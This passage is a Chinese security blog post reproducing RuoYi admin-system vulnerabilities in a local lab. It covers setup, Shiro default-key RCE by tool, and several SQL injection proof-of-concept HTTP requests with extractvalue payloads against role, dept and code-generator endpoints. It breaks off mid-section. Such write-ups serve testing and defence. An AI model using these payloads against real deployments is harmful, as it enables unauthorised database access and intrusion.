---
title: Ruoyi框架漏洞复现总结
url: https://mp.weixin.qq.com/s/z2sHF0nQibk4sOa0u2Xlmw
source: Doonsec's feed
date: 2026-10-28
fetch_date: 2026-10-29T07:49:54.998283
---

# Ruoyi框架漏洞复现总结

# Ruoyi框架漏洞复现总结

原创

炫彩之星
炫彩之星

菜鸟学安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

若依（RuoYi）是国内使用最广的 Java 开源后台管理系统之一，也是护网、红队演练里出场率最高的目标：前台的 Shiro、后台的 SQL 注入、文件读取、定时任务，几乎是每次遇到若依都要翻一遍的清单。

这篇文章记录我在本地搭建若依 4.5 环境（MySQL 8 + IDEA 启动）后，把框架前后台能打通的漏洞完整复现了一遍：前台 Shiro 默认 key 命令执行、后台多处 SQL 注入（含 4.7.5 代码生成器接口）、任意文件读取（CNVD-2021-01931）、定时任务 RCE 及其黑名单绕过、任意文件下载，共五大类，全部附了请求包和截图，环境版本、POC、利用条件都写明，拿到就能照着复现。

文末还整理了现成的综合利用工具和后台 Cookie 的获取方式，方便直接上手。

## 若依管理系统简介

若依管理系统（Ruoyi Admin System）是一款基于Java开发的开源后台管理系统，旨在提供一个快速开发和部署企业级管理系统的解决方案。若依管理系统采用前后端分离架构，前端使用Vue.js框架，后端使用Spring Boot框架。

## 复现环境搭建

首先上若依官网下载源码，官网地址：https://gitee.com/y\_project/RuoYi 我选择下载使用的ruoyi V4.5

```
1、安装MySQL数据库。
在本地安装MySQL数据库，我使用的是MySQL8.0.23版本，建议使用新版MySQL，使用MySQL5.几的版本导入若依sql文件会报错。
MySQL安装教程请自行搜索。
```

```
2、导入若依的sql文件
若依源码根目录下有一个名为sql的目录，该目录下有两个sql文件。有两种方式进行导入。
（1）使用navicat连接本地MySQL8数据库。
首先新建一个名为ry的数据库。
```

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grrClALjZWD86OOI7aFfXdDqQria3hWte7ia7l79KqicL1vKBia22bGypwdAZDkCwfcovNlanMrS3R3yMdPiaFRtpRHIos9fxdx1PWg/640?wx_fmt=png&from=appmsg)

选中ry数据库，点击鼠标右键，选择运行SQL文件
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gpKWb5uPhGvesUJ60Ila643jN6Zul9WYbf2mAJsDYo3dSuATkFhibcaynyo3M21m2Vn6deq4wd9g3lJaxk4Eg5zm6dMhwemaicUg/640?wx_fmt=png&from=appmsg)

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqJlA1EKc4pbw5Ah3OrD7yllbEumf6LjHZlBMg1T1Qm1P1Lz8xndRdCTSbveLIQKW5jqZZ9CHo2L1E1b2l3wXGERvrrSk1R0kg/640?wx_fmt=png&from=appmsg)
（2）使用IDEA进行数据文件的导入
首先使用idea新建一个MySQL数据源
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grzpPPV2iaIGGWCJvzD8VnO9fXhaic6o9aKaFnaLt5kFwro22v8fhmuPaibC1ZqVCIfgibUdXH9dCTNeQnGxwprPJGyJ9WPrgOGWKE/640?wx_fmt=png&from=appmsg)

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grSpianPKlR4HwzNKv7eY5X881J7LFDm5FaweYicaK6PV4Der3Xkswg5Olba4d8moD5yMozjdupsPcOZ7adcENJecaKZugicsz4wQ/640?wx_fmt=png&from=appmsg)

使用IDEA开启一个MySQL控制台，然后再控制台中使用执行以下sql语句新建数据库ry：create database ry;
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gpeTygxLGUoy9w63s1CMA5b0BI0mOwNHdImjFVwWFFY5x2chonAa5eIia3iceooNQsrt9Mu0FiczvXiariaL5o1IH1q8Q7kNwTQHLzc/640?wx_fmt=png&from=appmsg)

选中新建的ry数据库，然后新建一个MySQL控制台，然后将若依自带的两个sql文件中的内容粘贴到控制台中进行执行即可。
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gr5gNstkTH3AB42AcMzPJMnQ55Yu3auCp5G5qicJicaBFZ5VyKgONq6P2txkk3ZDsBWKxdDvUpboVbFT1m6zRmgZbmkdiaeRJDjtU/640?wx_fmt=png&from=appmsg)

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqg3EMqM4YP75FYOdbEbsNSTChIbZn7Z19l7fvdicKLmtA4roys1smjETn3eZ2JJBGWmDJSwibeDrGibT1UPJwM9115su5GmZlayI/640?wx_fmt=png&from=appmsg)

3、修改若依配置文件中的MySQL数据库的账号密码。
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grJezCbmVvlk4Lq9dlKdiaJehoZ17RibicltATZZgBVwe3uG94MKes2diaJFYANRPywAaPptcoKYibicxFYrViavc1V4liaqDvu863Gdyk/640?wx_fmt=png&from=appmsg)

4、使用idea启动若依项目即可，若依服务默认在本地的80端口。
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grvuFMvt0Nicvoxn0TPjiaElcTzibJwbPJjYQBfwd5ClXjSvpUIMmlZFb69icRZEa5xtRbGgteMkiaVDmFOTOpnUc4u0IPeRen3USiaM/640?wx_fmt=png&from=appmsg)

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grW1UiaUeTia4HpypHq6zHoib0GSVIsh31AFCWHgo7tLQPPLLsI9whAsRFiauPECIXlP1iaRjcQSU734QsxhmEXpfQZ0SDeNibEBZvKc/640?wx_fmt=png&from=appmsg)

出现上图的图标就证明若依正常运行。
使用浏览器访问若依后台管理系统，页面如下：
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqh4ZNlP8rhWfLU1BBn4kocrwibd1kOKwPlfSotChpfBcPeTEx8QGrAXGibgHu8mAOPyoVLyhvIkcNIMI9XKMvTxJTtoXTTbJnxc/640?wx_fmt=png&from=appmsg)

## 若依前台默认shiro key命令执行漏洞

### 漏洞简介

若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。

### 漏洞复现

直接使用Liqunkit工具梭哈
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gok7XjYbTYzCYRsbnZmgHIqxI1lyLBPrLcoDDkxibRe5oAcOl5NrClxVokMibvhHfXGu1IEfa68t4IOUoTicbcuZzsdsJ46wqr9S4/640?wx_fmt=png&from=appmsg)

## 若依后台存在多处sql注入漏洞

### 漏洞简介

若依后台存在多个SQL注入点

### 漏洞复现

进入后台后，拦截角色管理页面的请求包
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqzzD3kWMRibibpoEWfLkRU8PZxvenDvqrVIlqNUjsXc1Xd7ekRl3C8tvcpFNO2IKc91W3vXiccOG6E6d6zq59GtmZfd2MJwnibxJw/640?wx_fmt=png&from=appmsg)

#### 第一个sql注入点

POC：

```
POST /system/role/list HTTP/1.1
Host: 127.0.0.1
Content-Length: 179
sec-ch-ua: “Chromium”;v=“109”, “Not_A Brand”;v=“99”
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: “Windows”
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grDbPO1YI9sXRqqDGX8S8MkzstJHDNe8jlNu5pxee0lILpn83aZA5SbQ4W1aN0QrQbwhFHQ2X0J8rt643gS1UYdelicBicibUCTkU/640?wx_fmt=png&from=appmsg)

#### 第二个sql注入点：角色编辑接口

POC:

```
POST /system/dept/edit HTTP/1.1
Host: 127.0.0.1
Content-Length: 111
sec-ch-ua: “Chromium”;v=“109”, “Not_A Brand”;v=“99”
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: “Windows”
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1go6Z0IzdAgnTPkHt4In0kkDIO2MImUYeia3JHNsiabWBfG4ibFtO1MN5SLzXHrZhLLCkDHLOdMhgOOMosLDDpFYAdk4wLJh4JSooY/640?wx_fmt=png&from=appmsg)

#### 第三个sql注入点

POC：

```
POST /system/role/export HTTP/1.1
Host: 127.0.0.1
Content-Length: 75
sec-ch-ua: “Chromium”;v=“109”, “Not_A Brand”;v=“99”
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: “Windows”
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/role
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gruEEwVgcOVUJ2XB0icOandTYm9eWggEoyeUzaRzic44fmicJb1iawibicKkflG50q7hVvwWcameDribTCst7SQzl7BeBgkeNAKS3Vj8s/640?wx_fmt=png&from=appmsg)

### RuoYi4.7.5版本后台sql注入

ruoyi-4.7.5 后台 com/ruoyi/generator/controller/GenController 下/tool/gen/createTable路由存在sql注入。
POC：

```
sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
```

![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gobDqEdSk5ZeTxIKupHiaGFjXhmzhKKrpLPMGM60aQjjPv00ibAl5np8h8iaReKOcKx1jGvAGKYsVHZ9ZgXFSvialOJTyo2wflDaks/640?wx_fmt=png&from=appmsg)

## 若以后台任意...